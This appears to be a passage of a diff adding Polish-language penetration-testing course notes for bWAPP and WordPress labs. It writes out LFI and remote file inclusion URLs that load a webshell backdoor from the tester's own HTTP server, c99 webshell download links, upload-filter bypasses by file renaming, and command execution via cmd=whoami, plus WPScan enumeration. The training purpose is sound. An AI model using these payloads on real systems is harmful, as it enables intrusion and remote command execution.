+http://<ADRESBWAPPA>/rlfi.php?language=php://filter/read=convert.base64-encode/resource=rlfi.php&action=go
+
+***
+
+🔗 -- Przykładowe webshelle znajdziemy tutaj:
+/usr/share/webshells
+
+🔗 -- Informacje o RFI
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+
+### 📋 – Lab03 Remote File Inclusion
+ 
+Backdora należy pobrać z 
+/usr/share/webshells/php
+
+🔗 -- Reverse Shell Cheat Sheet
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+#Należy uruchomić http server na jeden z 2 sposobów:
+    python2.7  -m SimpleHTTPServer 9090
+    python3 -m http.server 9090
+
+w bWAPP należy wybrać Remote &Local File Inclusion (RFI/LFI)
+w url należy podmienić =ip:9090/nazwa_webshell.php zamiast języka 
+$sprawdzamy nazwy/id obrazów dockera np: 6cbc6deaddc6:
+    docker ps
+    docker exec 6cbc6deaddc6 ls
+    docker exec 6cbc6deaddc6 whoami
+
+#wykonywanie komend na konkretnym dokerze o id 6cbc6deaddc6:
+    docker exec -it 6cbc6deaddc6 /bin/bash
+    cd /etc/php5/
+    ls
+    cd apache2/
+    ls
+    pwd
+    vi php.ini
+#zmieniamy w pliku php.ini poniższe wartości:
+     allow_url_fopen=on
+     allow_url_include=on
+#wyjście:
+    CTRL P + Q
+
+II metoda edycji pliku:
+#kopiujemy plik z kontenera (swój id kontenera):
+    docker cp 6cbc6deaddc6:/etc/php5/apache2/php.ini /home/kali
+nano php.ini (linka 816)
+#zmieniamy w pliku php.ini poniższe wartości:
+    allow_url_fopen=on
+    allow_url_include=on
+#wgrywamy zmieniony plik do dockera:
+    docker cp /home/kali/php.ini 6cbc6deaddc6:/etc/php5/apache2/php.ini
+#sprawdzamy czy plik jest po zmianach:
+    docker exec 6cbc6deaddc6 cat /etc/php5/apache2/php.ini | grep allow_url
+#restart usługi Apache2:
+    docker exec 6cbc6deaddc6 service apache2 restart 
+    docker exec 6cbc6deaddc6 service apache2 status 
+#Należy uruchomić http server:
+    python3 -m http.server 9090
+#wklejamy w bWAPP w url (zmiana ip na własny):
+    http://172.16.2.148:9001/rlfi.php?language=http://172.16.2.148:9090/simple-backdoor.php&cmd=ls&action=go
+    
+### 📋 – Lab04 Restricted File Upload
+
+🔗 -- Reverse Shell C99
+https://www.r57shell.net/single.php?id=13
+https://www.r57shell.net/shells/c99.rar
+
+    unrar x c99.rar
+
+
+#Skorygowanie uprawnień do docker images
+
+    docker exec 6cbc6deaddc6 chmod 777 /var/www/html/images
+
+
+bwapp / Unrestricted File Upload /
+
+#Wykonujemy Upload c99.php
+#Odwołujemy się do pliku w przeglądarce:
+http://localhost:9000/images/c99.php
+
+Poziom Medium
+
+#Kopiujemy plik pod nową nazwą, ponieważ otrzymujemy komunikat
+
+    Sorry, the file extension is not allowed. The following extensions are blocked: asp, aspx, dll, exe, jsp, php
+
+
+c99.php3
+
+#Odwołujemy się do pliku w przeglądarce:
+http://localhost:9000/images/c99.php3
+
+Poziom High
+
+#Kopiujemy plik pod nową nazwą ponieważ otrzymujemy komunikat
+
+    Sorry, the file extension is not allowed. Only the following extensions are allowed: jpg, png
+
+
+# Uploadujemy shella simple-backdoor.php
+http://localhost:9000/images/simple-backdoor.php.jpg
+
+#Przechodzimy do / Remote & Local File Inclusion (RFI/LFI) / Poziom Low
+
+#Odwołujemy się do pliku z parametrem cmd=whoami w przeglądarce:
+http://localhost:9000/rlfi.php?language=images/simple-backdoor.php.jpg&cmd=whoami&action=go
+
+***
+
+### 📋 – Lab05 Adding Content to WordPress
+
+Wordpress in Docker
+https://github.com/docker/awesome-compose/tree/master/official-documentation-samples/wordpress/
+
+service apache2 stop
+
+mkdir wordpress
+nano docker-compose.yml
+
+services:
+  db:
+    # We use a mariadb image which supports both amd64 & arm64 architecture
+    image: mariadb:10.6.4-focal
+    # If you really want to use MySQL, uncomment the following line
+    #image: mysql:8.0.27
+    command: '--default-authentication-plugin=mysql_native_password'
+    volumes:
+      - db_data:/var/lib/mysql
+    restart: always
+    environment:
+      - MYSQL_ROOT_PASSWORD=somewordpress
+      - MYSQL_DATABASE=wordpress
+      - MYSQL_USER=wordpress
+      - MYSQL_PASSWORD=wordpress
+    expose:
+      - 3306
+      - 33060
+  wordpress:
+    image: wordpress:latest
+    volumes:
+      - wp_data:/var/www/html
+    ports:
+      - 80:80
+    restart: always
+    environment:
+      - WORDPRESS_DB_HOST=db
+      - WORDPRESS_DB_USER=wordpress
+      - WORDPRESS_DB_PASSWORD=wordpress
+      - WORDPRESS_DB_NAME=wordpress
+volumes:
+  db_data:
+  wp_data:
+
+apt update && apt install docker-compose
+docker-compose up
+
+Przeglądarka
+http://localhost/wp-admin/install.php
+
+    Dodajemy nowe teamty - Themes
+
+    Dodajemy nowe wtyczki - Plugins np. Yoast SEO
+
+    Dodajemy nowych użytkowników w różnych rolach
+
+
+#Wyświetlenie zawartości pliku konfiguracyjnego wp-config.php
+
+    docker exec 7e12c5052ec9 cat wp-config.php
+
+
+***
+
+### 📋 – Lab06 WPScan
+
+wpscan --update
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+
+[i] Updating the Database ...
+[i] Update completed.
+
+
+Skanowanie Wordpress:
+
+
+    Podstawowy skan
+
+    wpscan --url http://localhost:80
+
+    Enumeracja Themes i Plugins
+
+    wpscan --url http://localhost:80 -e vp vt
+
+    Enumeracja Użytkowników z ID od 1-5
+
+    wpscan --url http://localhost:80 -e u1-5
+
+
+***
+
+[PT Flow, Reporting & Vulnerability Scanners]
+
+🔗 -- PTES Technical Guideline
+http://www.pentest-standard.org/index.php/Main_Page
+
+🔗 -- OWASP Testing Guides
+https://owasp.org/www-project-web-security-testing-guide/latest/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies#owasp-testing-guides
+
+https://owasp.org/www-project-web-security-testing-guide/
+
+
+🔗 -- Przykładowe Raporty z pentestów
+https://sekurak.pl/zobacz-pelen-nieocenzurowany-raport-z-testow-penetracyjnych-canal/
+
+https://sekurak.pl/pelen-raport-z-prawdziwych-testow-bezpieczenstwa/
+
+https://sekurak.pl/swiezy-raport-z-testow-penetracyjnych-w-sumie-30-podatnosci-zlokalizowanych-w-6-dni/
+
+https://sekurak.pl/pelen-raport-z-realnych-testow-bezpieczenstwa-aplikacji-eventowej-bez-zadnej-cenzury/
+
+🔗 -- Common Vulnerability Scoring System Calculator
+https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
+
+
+### 📋 – Lab PT Report
+
+Instalacja ZAP OWASP
+
+    apt install zaproxy
+
+
+
+
+
+
